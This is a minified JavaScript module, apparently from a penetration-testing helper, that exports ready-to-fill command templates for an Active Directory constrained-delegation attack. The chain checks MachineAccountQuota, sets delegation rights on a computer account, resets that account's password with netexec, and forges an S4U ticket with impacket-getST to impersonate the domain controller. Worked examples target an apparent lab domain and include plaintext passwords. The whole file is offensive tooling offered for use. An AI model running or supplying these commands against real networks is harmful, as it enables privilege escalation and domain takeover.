const e=[{title:"Check MachineAccountQuota (netexec ldap)",description:"Query the domain controller for MachineAccountQuota using netexec's LDAP module.",template:`netexec ldap {ip} -u {username} -p '{password}' -M maq

Example:
netexec ldap dc.redelegate.vl -u marie.curie -p 'Fall2024!' -M maq`},{title:"Enable constrained delegation on a computer (PowerShell)",description:"Mark a computer account as trusted for delegation and add an msDS-AllowedToDelegateTo entry using PowerShell (Get/Set-AD* cmdlets).",template:`Set-ADAccountControl -Identity "{computer}$" -TrustedToAuthForDelegation $True
Set-ADObject -Identity "CN={computer},CN=COMPUTERS,DC={domain_part1},DC={domain_part2}" -Add @{"msDS-AllowedToDelegateTo"="{spn}"}

Example:
Set-ADAccountControl -Identity "FS01$" -TrustedToAuthForDelegation $True
Set-ADObject -Identity "CN=FS01,CN=COMPUTERS,DC=REDELEGATE,DC=VL" -Add @{"msDS-AllowedToDelegateTo"="ldap/dc.redelegate.vl"}`},{title:"Change computer account password (netexec smb)",description:"Use netexec's SMB module to change a computer account password (operator must have rights to change the computer account).",template:`netexec smb {ip} -u {username} -p {password} -M change-password -o USER='{computer}$' NEWPASS=Password123!

Example:
netexec smb dc.redelegate.vl -u helen.frost -p Password123 -M change-password -o USER='FS01$' NEWPASS=Password123`},{title:"Request service ticket / S4U flow (getST.py)",description:"Request S4U2Self / S4U2Proxy to obtain a service ticket for an SPN using a computer account credential (getST.py template).",template:`impacket-getST '{domain}/{computer}$:{computer_password}' -spn {spn} -impersonate {target_object}

Example:
impacket-getST 'redelegate.vl/FS01$:Password123' -spn ldap/dc.redelegate.vl -impersonate dc`}],t={commands:e};export{e as commands,t as default};
